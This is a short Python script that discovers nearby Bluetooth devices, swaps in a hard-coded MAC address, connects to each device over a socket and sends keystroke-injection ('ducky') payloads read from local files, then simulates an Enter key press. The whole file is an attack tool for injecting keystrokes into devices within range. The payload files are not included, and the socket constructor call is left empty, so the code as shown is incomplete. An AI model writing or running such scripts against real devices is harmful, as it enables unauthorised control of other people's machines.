import bluetooth
import pyautogui
import time

print("We out")

def inject():
    dev_list = bluetooth.discover_devices(duration=5, lookup_names=True)
    print(dev_list)

    fifteen11 = "D0:88:0C:C2:A0:C7"
    dev_list[0] = (fifteen11, "1511")

    for addy, name in dev_list:
        socket = bluetooth.BluetoothSocket(

        )
        
        socket.connect((addy, 1))

        ducky_script_file = '6. Real anti text\inject.bin'
        ducky_script_file2 = '6. Real anti text\duckypayload.txt'

        with open(ducky_script_file, 'rb') as file:
            ducky_script = file.read()
            print(ducky_script)
            socket.sendall(ducky_script)

        with open(ducky_script_file2, 'r') as file:
            ducky_script2 = file.read()
            socket.sendall(bytes(ducky_script2, encoding="utf-8"))

        time.sleep(5)

        socket.close()
        pyautogui.press('enter')

        print("done")

if __name__ == "__main__":
    inject()